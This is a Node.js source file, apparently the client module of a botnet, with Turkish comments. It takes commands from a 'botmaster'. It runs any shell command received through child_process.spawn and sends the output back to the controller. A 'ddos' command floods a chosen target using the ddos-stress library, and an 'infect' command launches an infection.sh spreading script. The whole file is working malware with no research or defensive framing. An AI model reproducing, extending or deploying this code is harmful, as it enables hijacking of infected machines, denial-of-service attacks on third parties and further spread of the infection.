module.exports = function(){
    return (function(thisSocket){
        var crypto = require('./crypto');
        var parser = require('./parser');
        var Packet = require('../models/Packet');
        var Promise = require('promise');

        var Stress = require('ddos-stress');


        var stress = new Stress();



        var send = require('./sender')(thisSocket).send;
        var spawn = require('child_process').spawn;


        var os = require('os');
        var hostname = os.hostname();

        var sender_id;
        var receiver_id;
        var self = this;
        var command;
        var commandData;

        //console.log("SOCKETTT-PROCESSOR="+thisSocket.id);

        //Botmasterdan gelen paketin işlendiği kısım.
        var processPacket = function(packet, receiver_id, sender_id){
            self.sender_id = sender_id;
            self.receiver_id = receiver_id;

            console.log("base Socket="+thisSocket);

            command = Object.keys(packet.data);
            commandData = packet.data[command];
            console.log("CMD-DATA="+commandData);

            commandHandler(command, commandData, self.receiver_id, self.sender_id);



        };

        //Botmasterdan gelen terminal komutlarının karşılandığı fonksiyon.
        function commandHandler(command, commandData, receiver_id, sender_id){
            console.log("COMMAND="+command);

            if(command == 'cmd'){

                    var result;
                    var splitted = commandData.split(' ');
                    var firstElement = splitted[0];
                    //shift metodu dizinin ilk elemanını diziden çıkartır.
                    splitted.shift();

                    var args = splitted;

                    if(args === firstElement){
                        args = [];
                    }

                    if(firstElement === 'kill'){
                        try{
                            //Child prosesin sonlandırılması ve botmastera bu bilginin yollanması.
                            child_p.kill();
                            var paket = new Packet(receiver_id, sender_id, {
                                output:new Buffer.from("Proses basariyla sonlandirildi.").toString('base64'),
                                name:hostname});


                            send(paket);

                        }catch (err){
                            var paket = new Packet(receiver_id, sender_id, {
                                output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
                                name:hostname});

                            send(paket);
                        }

                    }else if(firstElement === 'ddos'){
                        if(args[0] === 'stop'){
                            var paket = new Packet(receiver_id, sender_id, {
                                output:new Buffer.from("DDoS saldirisi sonlandirildi.").toString('base64'),
                                name:hostname});

                            send(paket);
                            stress.runningState=false;

                        }else{
                            //burada dos saldırısı yapılacak.
                            var target = args[0];
                            var reqPerSecond = args[1];

                            stress.runningState = true;
                            stress.resetStats();
                            stress.run(target, reqPerSecond);
                            var paket = new Packet(receiver_id, sender_id, {
                                output:new Buffer.from(target+" hedefine ddos saldirisi baslatildi.").toString('base64'),
                                name:hostname});

                            send(paket);
                        }



                    }else if(firstElement === 'infect'){
                        
                        child_p = spawn("./infection.sh");
                        child_p.stdout.setEncoding('utf-8');

                        child_p.on('error', function(output){
                            var paket = new Packet(receiver_id, sender_id, {
                                output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
                                name:hostname});

                            send(paket);

                        });

                        
                                    
                                    
                                paket = new Packet(receiver_id, sender_id, {
                                     output:new Buffer("Bulasma baslatildi.").toString('base64'),
                                     name:hostname});

                                send(paket);

                       


                    }else{
                        //Botmasterın gönderdiği komutu icra eden kısım. Output oldukça fulfill gönderir.

                            child_p = spawn(firstElement, args);
                            child_p.stdout.setEncoding('utf-8');

                            child_p.on('error', function(output){
                                var paket = new Packet(receiver_id, sender_id, {
                                    output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
                                    name:hostname});

                                send(paket);

                            });

                            child_p.stdout.on('data', function(data){

                                var output=data;
                                if(data){
                                    console.log('veri gönderiliyor..'+output);
                                    var x = new Buffer(output).toString('base64');
                                    console.log("BASE-STRING="+x);
                                    paket = new Packet(receiver_id, sender_id, {
                                        output:new Buffer(output).toString('base64'),
                                        name:hostname});

                                    send(paket);
                                }

                            });

                        //Botmaster terminal komutu gönderdiğinde çalışacak kısım.
                        /*return new Promise(function(fulfill, reject){
                           //console.log(data);
                           child_p = spawn(firstElement, args);
                           child_p.stdout.setEncoding('utf-8');

                           child_p.on('error', function(output){
                               var paket = new Packet(receiver_id, sender_id, {
                                   output:new Buffer.from("Bir hata meydana geldi.").toString('base64'),
                                   name:hostname});

                               var encoded = parser.encode(paket);
                               console.log("ENCODED",encoded);
                               var encrypted = crypto.encrypt(encoded);
                               console.log("ENCRYPTED="+encrypted);
                               fulfill(encrypted);

                           })

                           child_p.stdout.on('data', function(data){

                               var output=data;
                               console.log('veri gönderiliyor..'+output);
                               var x = new Buffer(output).toString('base64');
                               console.log("BASE-STRING="+x);
                               paket = new Packet(receiver_id, sender_id, {
                                   output:new Buffer(output).toString('base64'),
                                   name:hostname});
                               console.log("OUTPUT="+output);
                               var encoded = parser.encode(paket);
                               console.log("ENCODED",encoded);
                               var encrypted = crypto.encrypt(encoded);
                               console.log("ENCRYPTED="+encrypted);
                               fulfill(encrypted);

                           });

                       })*/


                    }





            }else if(command == 'ack'){

                var paket = new Packet(receiver_id, sender_id, {name:hostname});

                send(paket);
            }else {

                var paket = new Packet(receiver_id, sender_id, 'selam');

                send(paket);
            }

        }


        /*function run_cmd(cmd, args){
            //spawn, sistem komutlarını çalıştırmamızı sağlayan bir komuttur.
            //child_process modülü bize isletim sistemi fonksiyonlarına erişmemizi sağlar.
            //spawn çağrısıyla dönen child proses return edilir.

            console.log("CMDD="+cmd);


            var child_p = spawn(cmd, args);

            return child_p;
        }*/



        return {
            processPacket:processPacket
        }
    });


}();

